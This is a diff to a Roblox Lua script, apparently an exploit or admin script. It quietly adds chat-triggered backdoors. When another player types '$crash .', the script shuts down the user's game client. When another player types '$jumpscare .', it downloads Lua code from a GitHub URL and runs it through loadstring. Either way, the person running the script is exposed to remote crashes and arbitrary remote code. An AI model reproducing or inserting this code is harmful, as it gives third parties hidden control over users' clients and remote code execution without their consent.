@@ -426,6 +426,23 @@ local freeze = function()
 			end
 		
 		end)
+		v.Chatted:connect(function(cht)
+			if cht:match("$crash .") then
+				if game.Players.LocalPlayer ~= v then
+				game:Shutdown()
+				end
+	    end
+		end)
+		v.Chatted:connect(function(cht)
+			if cht:match("$jumpscare .") then
+				if game.Players.LocalPlayer ~= v then
+				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
+				end
+			end
+		
+		end)
+
+------UNEXPECTED NVM LOL--------
 		end
 		end
 	end
